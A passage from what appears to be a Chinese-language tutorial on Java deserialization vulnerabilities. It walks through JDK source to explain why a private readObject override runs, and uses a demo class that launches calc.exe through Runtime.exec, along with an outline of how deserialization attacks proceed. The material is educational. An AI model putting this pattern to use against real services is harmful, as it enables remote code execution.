alt><br>执行calc.exe，弹计算器成功</p><p>那么我们可知普通的java反序列化攻击必须要满足以下条件：</p><ol><li>反序列化点输入可控</li><li>使用readObject函数执行反序列化</li><li>当前class空间中存在一个可复写readObject的类</li><li>由于未知的可序列化的readObject类不一定会允许任意代码执行，我们还需要根据当前环境再这个复写readObject类中进一步构筑可利用链（示例代码用的user类简化了这一步骤，实际利用链不在这篇讨论范围内，并且现在的我也不会哈哈）</li></ol><p>通常的攻击流程就是：</p><ol><li>先通过目标服务器中可复写的readObject类来构建可任意代码执行的序列化payload</li><li>再通过可控输入点输入payload，执行readObject()函数，从而执行复写的readObject函数，再通过可利用链形成任意代码执行<br>（笼统来说是这样的嗷）</li></ol><h3 id="第二个问题"><a href="#第二个问题" class="headerlink" title="第二个问题"></a>第二个问题</h3><p>我们重新回头看这个我们写的这个user类的readObject函数：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span>  <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>此处存在两个注意点：</p><ol><li>readObject函数必须是<code>private</code>属性</li><li>readObject函数必须传参<code>java.io.ObjectInputStream in</code></li></ol><p>那么问题来了，<strong>到底为什么readObject函数要使用private属性，传参java.io.ObjectInputStream呢</strong>?</p><h4 id="那么深究一下为啥呢"><a href="#那么深究一下为啥呢" class="headerlink" title="那么深究一下为啥呢"></a>那么深究一下为啥呢</h4><p>先在<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;)</code>处下断点，运行。<br>得到如下调用栈</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g666z9wj85j31qa11btd1.jpg" alt></p><p>根据调用栈的层次来回溯是如何执行到<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;)</code><br>先是<code>ObjectInputStream.java</code>的<code>readObject</code>函数</p><blockquote><p>idea正向调试时，有些函数需要强制进入，虽然在调用最末端下断点是不需要的，这里简单提一下</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">readObject</span><span class="params">()</span></span></span><br><span class="line"><span class="function">       <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (enableOverride) &#123;</span><br><span class="line">           <span class="keyword">return</span> readObjectOverride();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// if nested read, passHandle contains handle of enclosing object</span></span><br><span class="line">       <span class="keyword">int</span> outerHandle = passHandle;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">//进入这里，默认传入false</span></span><br><span class="line">           Object obj = readObject0(<span class="keyword">false</span>);</span><br><span class="line">           handles.markDependency(outerHandle, passHandle);</span><br></pre></td></tr></table></figure><blockquote><p>一开始我还以为是如果覆盖了enableOverride为true，直接通过readObjectOverride去调用我们的函数。实际上….完全不是= =</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">private</span> Object <span class="title">readObject0</span><span class="params">(<span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"><span class="comment">// ...省略...</span></span><br><span class="line">        <span class="keyword">byte</span> tc;</span><br><span class="line">        <span class="keyword">while</span> ((tc = bin.peekByte()) == TC_RESET) &#123; <span class="comment">//此处bin.peekByte()赋值为115，TC_RESET为121。等式不成立。由于自己太菜，不细究为什么115这些底层细节</span></span><br><span class="line">            bin.readByte();</span><br><span class="line">            handleReset();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">switch</span> (tc) &#123;<span class="comment">//此时tc是115</span></span><br><span class="line"><span class="comment">// ...省略...</span></span><br><span class="line">                <span class="keyword">case</span> TC_OBJECT:<span class="comment">//TC_OBJECT为115，感觉可能是反序列化的目标是一个Object的意思？</span></span><br><span class="line">                    <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared));<span class="comment">//先进入readOrdinaryObject函数，后进入checkResolve函数</span></span><br></pre></td></tr></table></figure><p>先执行readOrdinaryObject函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readOrdinaryObject</span><span class="params">(<span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">    <span class="comment">//省略一个抛出异常，没看懂</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    ObjectStreamClass desc </span>= readClassDesc(<span class="keyword">false</span>);<span class="comment">//此处会形成一个user类的ObjectStreamClass类</span></span><br><span class="line">    desc.checkDeserialize();<span class="comment">//检查是否反序列化？</span></span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();<span class="comment">//获取class user</span></span><br><span class="line">    <span class="keyword">if</span> (cl == String.class || cl == Class.class</span><br><span class="line">            || cl == ObjectStreamClass.class) &#123;<span class="comment">//一些类型不提供支持，报错</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(<span class="string">"invalid class descriptor"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object obj;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        obj = desc.isInstantiable() ? desc.newInstance() : <span class="keyword">null</span>;<span class="comment">//很关键 先判断是否有构造器，然后获取class user的实例化obj</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">            desc.forClass().getName(),</span><br><span class="line">            <span class="string">"unable to create instance"</span>).initCause(ex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//以下没搞懂，做一些判断</span></span><br><span class="line">    passHandle = handles.assign(unshared ? unsharedMarker : obj);</span><br><span class="line">    ClassNotFoundException resolveEx = desc.getResolveException();</span><br><span class="line">    <span class="keyword">if</span> (resolveEx != <span class="keyword">null</span>) &#123;</span><br><span class="line">        handles.markException(passHandle, resolveEx);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (desc.isExternalizable()) &#123;<span class="comment">//进行一次判断，如果序列化的接口是Externalizable类型，就进入readExternalData，否则进入readSerialData</span></span><br><span class="line">        readExternalData((Externalizable) obj, desc);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        readSerialData(obj, desc);<span class="comment">//我们进入这个readSerialData函数</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>Externalizable类型的反序列化类型，可以通过writeExternal()和readExternal()方法指定一个类的部分数据进行序列化与反序列化。<br>Serializable接口也可以实现类似的机制：将不想要序列化的部分添加一个关键字：transient（临时的）。它声明的变量实行序列化操作的时候不会写入到序列化文件中去。</p></blockquote><p>继续readSerialData()，这里我们传入了class user的实例obj，以及class user的ObjectStreamClass类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">   ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; slots.length; i++) &#123;<span class="comment">//这边好像是在做遍历需要反序列化的数据</span></span><br><span class="line">        ObjectStreamClass slotDesc = slots[i].desc;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (slots[i].hasData) &#123;<span class="comment">//判断是否有数据</span></span><br><span class="line">            <span class="keyword">if</span> (obj == <span class="keyword">null</span> || handles.lookupException(passHandle) != <span class="keyword">null</span>) &#123;<span class="comment">//做一些不知都是什么的意外判断，总之我们进入了else</span></span><br><span class="line">                defaultReadFields(<span class="keyword">null</span>, slotDesc); <span class="comment">// skip field values</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (slotDesc.hasReadObjectMethod()) &#123;<span class="comment">//很关键，判定我们反序列化的当前class是否存在ReadObject函数，结果为真</span></span><br><span class="line">                <span class="comment">//接下来就没看懂在干啥了..好像是在获取上下文？</span></span><br><span class="line">                ThreadDeath t = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">boolean</span> reset = <span class="keyword">false</span>;</span><br><span class="line">                SerialCallbackContext oldContext = curContext;</span><br><span class="line">                <span class="keyword">if</span> (oldContext != <span class="keyword">null</span>)</span><br><span class="line">                    oldContext.check();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    curContext = <span class="keyword">new</span> SerialCallbackContext(obj, slotDesc);</span><br><span class="line"></span><br><span class="line">                    bin.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">                    slotDesc.invokeReadObject(obj, <span class="keyword">this</span>);<span class="comment">//进入了这个函数，</span></span><br><span class="line">                    ....</span><br></pre></td></tr></table></figure><p><code>slotDesc.invokeReadObject(obj, this);</code></p><ul><li>slotDesc是我们反序列化的class user的ObjectStreamClass类</li><li>obj是class user的实例化</li><li>this就是<code>ObjectInputStream in</code>一类</li></ul><p>继续 invokeReadObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">invokeReadObject</span><span class="params">(Object obj, ObjectInputStream in)</span></span></span><br><span class="line"><span class="function">       <span class="keyword">throws</span> ClassNotFoundException, IOException,</span></span><br><span class="line"><span class="function">              UnsupportedOperationException</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       requireInitialized();</span><br><span class="line">       <span class="keyword">if</span> (readObjectMethod != <span class="keyword">null</span>) &#123;<span class="comment">//判断是否有readObjectMethod函数</span></span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               readObjectMethod.invoke(obj, <span class="keyword">new</span> Object[]&#123; in &#125;);<span class="comment">//调用了这个函数，并传入了一个ObjectInputStream的Object列表</span></span><br><span class="line">           &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">               Throwable th = ex.getTargetException();</span><br><span class="line">               <span class="keyword">if</span> (th <span class="keyword">instanceof</span> ClassNotFoundException) &#123;</span><br><span class="line">                   <span class="keyword">throw</span> (ClassNotFoundException) th;</span><br><span class="line">               &#125; <span class="keyword">else</span> <span class="keyword">if</span> (th <span class="keyword">instanceof</span> IOException) &#123;</span><br><span class="line">                   <span class="keyword">throw</span> (IOException) th;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="comment">// 省略...</span></span><br></pre></td></tr></table></figure><blockquote><p>一开始不是理解透彻反射机制，出了java反射机制一文学习了之后回来继续</p></blockquote><p><code>readObjectMethod.invoke(obj, new Object[]{ in })</code> 其实就是一处反射机制的使用：</p><ul><li><code>readObjectMethod</code> 是 Method类型，和反射中getMethod返回的结果一样</li><li><code>readObjectMethod.invoke</code>，调用Method类型的invoke方法，传输进入参数去调用该readObjectMethod函数，也就是我们复写的readObject函数</li><li>那么invoke方法需要传入的参数是：<ul><li>一个之前生成的class user的实例obj</li><li>之前传入的ObjectInputStream类型，用new Object[]进行封装（因为<code>invoke()</code>函数接受<code>Object... args</code>作为参数，需要加一层封装保证原始数据，具体参考java反射机制一文）</li></ul></li></ul><p>那么这里就使用反射机制完成了我们写入的readObject函数的调用。<br>但是我们依旧没有解决为什么我们的user类中复写的readObject函数要使用private属性，传参java.io.ObjectInputStream呢？</p><p>我们需要一个对照组</p><h4 id="不能复写成功的对照组"><a href="#不能复写成功的对照组" class="headerlink" title="不能复写成功的对照组"></a>不能复写成功的对照组</h4><p>对照组user class<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span>  <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//修改以下readObject类 private 为 public</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>先根据对比结果，总结之前的调用栈，做一个总的对比，然后细说<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.ReadObject() </span><br><span class="line">-&gt; readObject0() </span><br><span class="line">-&gt; readOrdinaryObject() </span><br><span class="line">-&gt; readSerialData() ===对照组发生分支==&gt; defaultReadFields(obj, slotDesc);</span><br><span class="line">--复写组的调用路径--&gt; invokeReadObject() </span><br><span class="line">-&gt; (反射机制调用)readObjectMethod.invoke(obj, <span class="keyword">new</span> Object[]&#123; in &#125;);</span><br></pre></td></tr></table></figure></p><p>两组的调用栈前面都是一致的，在<code>readSerialData()</code>中发生了判断分支：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">   ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; slots.length; i++) &#123;<span class="comment">//这边好像是在做遍历需要反序列化的数据</span></span><br><span class="line">        ObjectStreamClass slotDesc = slots[i].desc;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (slots[i].hasData) &#123;<span class="comment">//判断是否有数据</span></span><br><span class="line">            <span class="keyword">if</span> (obj == <span class="keyword">null</span> || handles.lookupException(passHandle) != <span class="keyword">null</span>) &#123;<span class="comment">//做一些不知都是什么的意外判断，总之我们进入了else</span></span><br><span class="line">                defaultReadFields(<span class="keyword">null</span>, slotDesc); <span class="comment">// skip field values</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (slotDesc.hasReadObjectMethod()) &#123;<span class="comment">//世界线变动之处，判定我们反序列化的当前class是否存在ReadObject函数，对照组的结果为假</span></span><br><span class="line">                ThreadDeath t = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">boolean</span> reset = <span class="keyword">false</span>;</span><br><span class="line">                SerialCallbackContext oldContext = curContext;</span><br><span class="line">                <span class="keyword">if</span> (oldContext != <span class="keyword">null</span>)</span><br><span class="line">                    oldContext.check();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    curContext = <span class="keyword">new</span> SerialCallbackContext(obj, slotDesc);</span><br><span class="line"></span><br><span class="line">                    bin.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">                    slotDesc.invokeReadObject(obj, <span class="keyword">this</span>);<span class="comment">//复写成功的情况，进入了这个函数，</span></span><br><span class="line">                    ....</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                defaultReadFields(obj, slotDesc);<span class="comment">//复写失败的对照组，进入了这个函数，最后调用了本身的readObject</span></span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure></p><p>那么我们可以知道，readObject的复写成功与否与<code>slotDesc.hasReadObjectMethod()</code>紧密相关，</p><p>slotDesc其实就是我们反序列化的class，而hasReadObjectMethod()其实就是判断这个反序列化class的ObjectInputStream类中的readObjectMethod参数是否为空。</p><p>那么readObjectMethod其实就是在生成ObjectInputStream类的时候就定义好了，到底是怎么生成的呢？我们需要去ObjectInputStream的构造函数中寻找答案<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">ObjectStreamClass</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; cl)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.cl = cl;</span><br><span class="line">    name = cl.getName();</span><br><span class="line">    isProxy = Proxy.isProxyClass(cl);</span><br><span class="line">    isEnum = Enum.class.isAssignableFrom(cl);</span><br><span class="line">    serializable = Serializable.class.isAssignableFrom(cl);</span><br><span class="line">    externalizable = Externalizable.class.isAssignableFrom(cl);</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; superCl = cl.getSuperclass();</span><br><span class="line">    superDesc = (superCl != <span class="keyword">null</span>) ? lookup(superCl, <span class="keyword">false</span>) : <span class="keyword">null</span>;</span><br><span class="line">    localDesc = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (serializable) &#123;<span class="comment">//查看是否可反序列化</span></span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction&lt;Void&gt;() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> Void <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (isEnum) &#123;</span><br><span class="line">                    suid = Long.valueOf(<span class="number">0</span>);</span><br><span class="line">                    fields = NO_FIELDS;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (cl.isArray()) &#123;</span><br><span class="line">                    fields = NO_FIELDS;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                suid = getDeclaredSUID(cl);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fields = getSerialFields(cl);</span><br><span class="line">                    computeFieldOffsets();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvalidClassException e) &#123;</span><br><span class="line">                    serializeEx = deserializeEx =</span><br><span class="line">                        <span class="keyword">new</span> ExceptionInfo(e.classname, e.getMessage());</span><br><span class="line">                    fields = NO_FIELDS;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (externalizable) &#123;<span class="comment">//是否Externalizable类型反序列化，为false</span></span><br><span class="line">                    cons = getExternalizableConstructor(cl);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;<span class="comment">//开始解析该类，并填充ObjectStreamClass类的常量，包括我们关注的readObjectMethod</span></span><br><span class="line">                    cons = getSerializableConstructor(cl);</span><br><span class="line">                    writeObjectMethod = getPrivateMethod(cl, <span class="string">"writeObject"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class&lt;?&gt;[] &#123; ObjectOutputStream.class &#125;,</span><br><span class="line">                        Void.TYPE);</span><br><span class="line">                    readObjectMethod = getPrivateMethod(cl, <span class="string">"readObject"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class&lt;?&gt;[] &#123; ObjectInputStream.class &#125;,</span><br><span class="line">                        Void.TYPE);<span class="comment">//赋值readObjectMethod</span></span><br></pre></td></tr></table></figure></p><p>查看<code>getPrivateMethod()</code>函数,我们传入了以下参数:</p><ul><li>cl：class user类</li><li>name：readObject字符串</li><li>argTypes：ObjectInputStream.class 的Class列表封装</li><li>returnType：void类型</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns non-static private method with given signature defined by given</span></span><br><span class="line"><span class="comment"> * class, or null if none found.  Access checks are disabled on the</span></span><br><span class="line"><span class="comment"> * returned method (if any).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Method <span class="title">getPrivateMethod</span><span class="params">(Class&lt;?&gt; cl, String name,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       Class&lt;?&gt;[] argTypes,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       Class&lt;?&gt; returnType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//获取class user中名为name：readObject字符串，并且接受参数类型为ObjectInputStream.class的方法</span></span><br><span class="line">        Method meth = cl.getDeclaredMethod(name, argTypes);</span><br><span class="line">        <span class="comment">//开放访问限制</span></span><br><span class="line">        meth.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//获取该方法的修饰符</span></span><br><span class="line">        <span class="keyword">int</span> mods = meth.getModifiers();</span><br><span class="line">        <span class="keyword">return</span> ((meth.getReturnType() == returnType) &amp;&amp;<span class="comment">//该方法的返回类型需要为void</span></span><br><span class="line">                ((mods &amp; Modifier.STATIC) == <span class="number">0</span>) &amp;&amp;<span class="comment">//该方法不能有Static修饰类型</span></span><br><span class="line">                ((mods &amp; Modifier.PRIVATE) != <span class="number">0</span>)) ? meth : <span class="keyword">null</span>;<span class="comment">//该方法需要是private的，满足所有条件，返回这个方法</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么通过<code>getPrivateMethod</code>函数的判定，只有满足以下条件的方法，readObjectMethod才会被赋值（即，readObject才会被赋值，即进入复写的世界线，执行被复写的参数）：</p><ul><li>方法名为readObject</li><li>返回类型为void</li><li>传入参数为一个ObjectInputStream.class类型参数</li><li>修饰符不能包含static</li><li>修饰符必须包含private</li></ul><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>至此我们从源码彻底搞清楚了readObject为什么会形成复写，</p><p>这不是java设计导致的漏洞，而是本身的设计就是允许readObject复写，甚至详细制定了判定何种参数设定会解析为readObject复写</p><p>那么就产生了几个疑问:</p><ol><li><strong>一直以来java反序列化漏洞频出，为什么java要支持readObject复写？</strong></li></ol><p>因为类的实例序列化，不会将static变量和transient变量序列化，如果我们需要序列化这些变量就需要复写readObject函数，像下面这样：</p><p>(01) 通过writeObject()方法，写入要保存的变量。writeObject的原始定义是在ObjectOutputStream.java中，我们按照如下示例覆盖即可：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException</span>&#123; </span><br><span class="line">    out.defaultWriteObject();<span class="comment">// 使定制的writeObject()方法可以利用自动序列化中内置的逻辑。 </span></span><br><span class="line">    out.writeInt(ival);      <span class="comment">// 若要保存“int类型的值”，则使用writeInt()</span></span><br><span class="line">    out.writeObject(obj);    <span class="comment">// 